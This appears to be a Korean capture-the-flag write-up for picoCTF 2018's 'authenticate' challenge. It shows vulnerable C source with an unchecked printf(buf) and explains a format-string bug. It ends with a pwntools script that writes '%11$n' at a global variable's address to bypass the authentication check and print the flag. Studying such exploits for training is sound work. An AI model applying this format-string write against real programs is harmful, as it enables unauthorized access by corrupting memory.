# picoCTF 2018

<h5> authenticate </h5>
<hr>

<h5> Solution </h5>

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

int authenticated = 0;

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}

void read_flag() {
  if (!authenticated) {
    printf("Sorry, you are not *authenticated*!\n");
  }
  else {
    printf("Access Granted.\n");
    flag();
  }

}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  printf("Would you like to read the flag? (yes/no)\n");

  fgets(buf, sizeof(buf), stdin);
  
  if (strstr(buf, "no") != NULL) {
    printf("Okay, Exiting...\n");
    exit(1);
  }
  else if (strstr(buf, "yes") == NULL) {
    puts("Received Unknown Input:\n");
    printf(buf);
  }
  
  read_flag();

}
```

<p> 이번 문제는 FSB(Format String Bug) 취약점의 문제이다. </p>
<p> 코드의 55라인에서 buf 변수를 printf 로 출력 해주는데, 여기서 FSB 취약점이 터지게 된다. </p>
<p> 그럼 우리가 입력해주는 buf 변수의 오프셋 위치를 확인해보자, </p>

<img class="border-shadow" src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fk.kakaocdn.net%2Fdn%2FtMydD%2FbtqxUq7B031%2FYlhFysqaFKRaP3PKIhBnA1%2Fimg.png"><br>

<p> AAAA 로 입력값을 주고 %p 로 주소값 출력을 시켜주면, 우리가 입력한 값은 11번째 오프셋에 저장되있다. </p>

<p> 이제 다시 코드로 돌아가서 보면 read_flag() , 플래그를 출력해주는 함수에서 authenticated 변수에 대해서 <br>
True/False 인지에 대한 조건을 검사하고 있다. </p>

<p> 기본적으로 코드에서 선언된 authenticated 의 값은 0(FALSE) 로 선언해주었고, 하나 이상의 값이 존재한다면, 해당 조건을 통과시킬 수 있다. </p>

<img class="border-shadow" src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fk.kakaocdn.net%2Fdn%2FbeclfJ%2FbtqxWKKBaCP%2FAqBdsnkJdoUH7iQBYD2r01%2Fimg.png"><br>

<p> 그럼, authenticated 변수에 대한 함수의 주소를 구해보면 다음과 같다. </p>

<p> 해당 함수의 주소를 써주고, 조건문을 통과 시킨 뒤, 11번째 오프셋에 대해서 %11$n 으로 입력해주면 플래그를 볼 수 있다. </p>

```py
#!/usr/bin/python

from pwn import *

p = remote('2018shell.picoctf.com',26336)

payload = p32(0x804a04c)
payload += "%11$n"

p.sendline(payload)
p.interactive()
```
